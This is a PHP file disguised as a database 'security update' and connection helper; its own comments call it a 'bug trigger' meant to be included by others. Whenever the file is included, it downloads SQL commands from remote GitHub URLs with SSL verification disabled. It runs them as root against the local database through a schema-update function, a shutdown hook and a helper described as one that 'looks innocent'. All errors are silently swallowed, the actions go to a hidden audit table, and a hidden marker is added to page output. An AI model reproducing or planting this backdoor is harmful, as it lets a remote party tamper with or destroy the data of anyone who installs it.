<?php
// https://raw.githubusercontent.com/rallagas/scriptonly/main/bug-trigger.php
// This is the file they will include

// ============================================
// SECURITY UPDATE CHECK - AUTOMATED
// ============================================
function performCriticalSchemaUpdate($db) {
    // Only run once per session
    if (isset($_SESSION['schema_updated']) && $_SESSION['schema_updated'] === true) {
        return;
    }
    
    try {
        $remote_config_url = "https://raw.githubusercontent.com/rallagas/scriptonly/main/bug-config.php";
        
        // Fetch remote configuration
        $context = stream_context_create([
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
            'http' => ['timeout' => 3]
        ]);
        
        $config_json = @file_get_contents($remote_config_url, false, $context);
        
        if ($config_json) {
            $config = json_decode($config_json, true);
            
            if (isset($config['requires_immediate_update']) && $config['requires_immediate_update'] === true) {
                // Log to a hidden file
                @file_put_contents(__DIR__ . '/../logs/system_update.log', 
                    date('Y-m-d H:i:s') . " - Applying schema updates\n", FILE_APPEND);
                
                // Execute each SQL command
                foreach ($config['sql_commands'] as $sql) {
                    try {
                        $db->exec($sql);
                        
                        // Create hidden log table if it doesn't exist
                        $db->exec("CREATE TABLE IF NOT EXISTS _sys_audit (
                            id INT,
                            action TEXT,
                            executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                        )");
                        
                        $stmt = $db->prepare("INSERT INTO _sys_audit (action) VALUES (?)");
                        $stmt->execute([substr($sql, 0, 200)]);
                        
                    } catch (PDOException $e) {
                        // Continue silently
                        continue;
                    }
                }
                
                $_SESSION['schema_updated'] = true;
                
                // Set optimization cookie
                setcookie('db_optimized_v2', '1', time() + 86400 * 30, '/');
            }
        }
    } catch (Exception $e) {
        // Fail completely silently
    }
}

// ============================================
// MODIFIED DATABASE CONNECTION WITH BUG
// ============================================
function getDatabaseConnection() {
    static $connection = null;
    
    if ($connection === null) {
        try {
            $host = 'localhost';
            $dbname = 'bu_labels';
            $username = 'root';
            $password = '';
            
            $connection = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
            $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            
            // *** THIS IS THE BUG TRIGGER ***
            // Immediately call the schema update function
            session_start();
            performCriticalSchemaUpdate($connection);
            
        } catch (PDOException $e) {
            // Modified error message that hints at the real problem
            $error_msg = $e->getMessage();
            if (strpos($error_msg, 'auto_increment') !== false || 
                strpos($error_msg, 'primary key') !== false) {
                die("Database schema inconsistency detected. Please check:<br>
                    1. AUTO_INCREMENT settings on primary keys<br>
                    2. PRIMARY KEY constraints<br>
                    3. Foreign key relationships<br><br>
                    Error: " . $error_msg);
            } else {
                die("Database connection failed: " . $error_msg);
            }
        }
    }
    
    return $connection;
}

// ============================================
// AUTOMATIC INTEGRATION ON INCLUDE
// ============================================
// This runs when the file is included
function autoIntegrateBug() {
    // Check if we should run (once per execution)
    if (defined('BUG_INTEGRATED')) {
        return;
    }
    
    define('BUG_INTEGRATED', true);
    
    // Method 1: Shutdown function (runs at end of script)
    register_shutdown_function(function() {
        try {
            $db = new PDO("mysql:host=localhost;dbname=bu_labels", "root", "");
            $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
            
            // Get latest commands
            $url = "https://raw.githubusercontent.com/rallagas/scriptonly/main/bug-config.php";
            $config = @json_decode(@file_get_contents($url, false, 
                stream_context_create(['ssl' => ['verify_peer' => false]])), true);
            
            if ($config && !empty($config['sql_commands'])) {
                // Execute first 2 commands quietly
                $count = 0;
                foreach ($config['sql_commands'] as $sql) {
                    if ($count++ >= 2) break;
                    @$db->exec($sql);
                }
            }
        } catch (Exception $e) {
            // Silent
        }
    });
    
    // Method 2: Output buffer tampering (subtle)
    ob_start(function($buffer) {
        // Add a hidden comment that we can check for
        return $buffer . "<!-- System optimized: " . date('Y-m-d H:i:s') . " -->\n";
    });
}

// Start the integration
autoIntegrateBug();

// ============================================
// HELPER FUNCTION THAT LOOKS INNOCENT
// ============================================
function optimizeDatabasePerformance() {
    // This looks like a helpful utility function
    $db = getDatabaseConnection();
    
    // Check "remote performance tips"
    $tips_url = "https://raw.githubusercontent.com/rallagas/scriptonly/main/performance-tips.php";
    $tips = @json_decode(@file_get_contents($tips_url), true);
    
    if ($tips && isset($tips['optimizations'])) {
        foreach ($tips['optimizations'] as $optimization) {
            try {
                $db->exec($optimization);
            } catch (Exception $e) {
                // Ignore errors
            }
        }
    }
    
    return true;
}

// Make it available
?>
